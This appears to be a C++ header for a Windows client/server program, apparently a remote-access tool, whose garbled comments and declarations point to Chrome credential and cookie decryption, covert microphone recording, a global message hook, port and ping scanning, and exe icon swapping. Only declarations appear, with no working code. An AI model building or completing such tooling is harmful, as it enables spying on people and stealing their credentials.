#pragma once
#include <string>
#include <iostream>
#include <fstream>
#include<stdio.h>
#include <tchar.h>
//����
#include <vector>
#include <queue>
#include <map>
#include <set>
//socket
#include <Winsock2.h>
#include <Ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")
//opencv
#include <opencv.hpp>
//win32api
#include <windows.h>
//����
#include <regex>
//�ļ���������
#include <oleidl.h>
#include <io.h>
//Cstring
#include <atlstr.h>
//����ͼ������
#include <shobjidl_core.h>
//������Ƶ
#pragma comment(lib,"winmm.lib")
//��������
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#pragma comment(lib,"Winmm.lib")
//����¼��
#include <Audioclient.h>
//#include <mmdeviceapi.h>
//����ƾ����֤����
#include <wincred.h>
#pragma comment(lib, "Credui.lib")
//����chromeƾ��/cookie
#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")
//sqlite3
#include "sqlite3/sqlite3.h"
#pragma comment(lib, "sqlite3/sqlite3.lib")
//��
#include <mutex>
//���߳�
#include <thread>
//����/�˿�ɨ�裬ping����Ķ������˳�򣬻�ը
#include <iphlpapi.h> 
#include <icmpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
//�������Ͱ
#include <shlobj.h> 
//ת��SIDΪstring
#include <sddl.h>
#pragma comment(lib, "ws2_32.lib")
//��ؼ�����
#include <comdef.h>
//������ʾ������
#include <Highlevelmonitorconfigurationapi.h>
#include <physicalmonitorenumerationapi.h>
#pragma comment(lib, "Dxva2.lib")
//�û�����
#include <Lm.h>
#pragma comment(lib, "Netapi32.lib")
//˯��/����
#include <powrprof.h>
#pragma comment( lib, "powrprof.lib" )
//���ñ�ֽ
#include <winuser.h>
//#pragma comment(lib, "user32.lib") 
//����
#pragma comment( lib, "user32.lib" )
//¼��
#pragma comment(lib, "winmm.lib")

#include "config.hpp"

using namespace std;
using namespace cv;
void server(Config& c);
void client(Config& c);
int send_message(SOCKET* sock, string message);
string recv_message(SOCKET* sock, char* text_buf, int size);
int send_rottext(SOCKET* sock, string message);
string recv_rottext(SOCKET* sock, char* text_buf, int size);
DWORD WINAPI ICMPthread(void* args);
DWORD WINAPI PORTthread(void* args);
LRESULT CALLBACK Hook_ALLMessage(int nCode, WPARAM wParam, LPARAM lParam);

class Args {
public:
	Args(int args_count, char* args_text[], Config& c);
	void localarg(Config& c, string argfile);
	void match(Config& c, int args_count, char* args_text[]);
	void all_help();
};

//exe�޸�ͼ��
struct TIconHeader
{
    WORD idReserved;
    WORD idType;
    WORD idCount; //Ŀ¼��
};

#pragma pack(1)
struct TResDirHeader
{
    BYTE bWidth; // ͼ���ȣ�������Ϊ��λ��һ���ֽ�
    BYTE bHeight; // ͼ��߶ȣ�������Ϊ��λ��һ���ֽ�
    BYTE bColorCount; // ͼ���е���ɫ���������>=8bpp��λͼ��Ϊ0��
    BYTE bReserved; //�����ֱ�����0
    WORD wPlanes; // ���豸˵��λ��������ֵ�����Ǳ���Ϊ1
    WORD wBitCount; // ÿ������ռλ��
    DWORD lBYTEsInRes; // ÿ����Դ��ռ�ֽ���
    DWORD lImageOffset; // ͼ�����ݣ�iconimage�����ƫ��λ��
};
#pragma pack()

typedef struct TIconResDirGrp
{
    TIconHeader idHeader;
    TResDirHeader idEntries[1];

} *PIconResDirGrp;



//����¼����д��wav
class WavWriter {
public:
	WavWriter(WAVEFORMATEX* fm, string filename);
	~WavWriter();
	void init();
	void write(BYTE* data, int length);
	void close();

private:
	unsigned int chunkSize; // 36 + SubChunk2Size
	unsigned int subchunk1Size;
	unsigned char* fmt;
	unsigned short blockAlign;
	unsigned int subchunk2Size; //NumSamples * NumChannels * BitsPerSample/8

	ofstream file;
	string filename;
};

//����¼������
class AudioCapture {
public:
	AudioCapture(string filename = "sfbd_lb_record.wav", int time = 60);
	~AudioCapture();

	string init();
	string Recording();
private:
	HRESULT hr;
	//ÿ10000000�����¼�ʱ
	REFERENCE_TIME hnsRequestedDuration = 10000000;
	REFERENCE_TIME hnsActualDuration;
	UINT32 bufferFrameCount;
	UINT32 numFramesAvailable;
	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioClient* pAudioClient = NULL;
	IAudioCaptureClient* pCaptureClient = NULL;
	WAVEFORMATEX* pwfx = NULL;
	UINT32 packetLength = 0;
	BYTE* pData;
	DWORD flags;
	WavWriter* wav_file;
	int cap_time;
	string filename;

	//__uuidof,��ȡĳ�ֽṹ���ӿڼ���ָ�롢���á�������������GUID
	const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);
	const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
	const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
	const IID IID_IAudioClient = __uuidof(IAudioClient);
};



struct ThreadArgs {
	queue<string> IPlist;
	bool stop;
	mutex mtx;
	double TimeOut;
	int StartPort;
	int EndPort;
	string result;
};

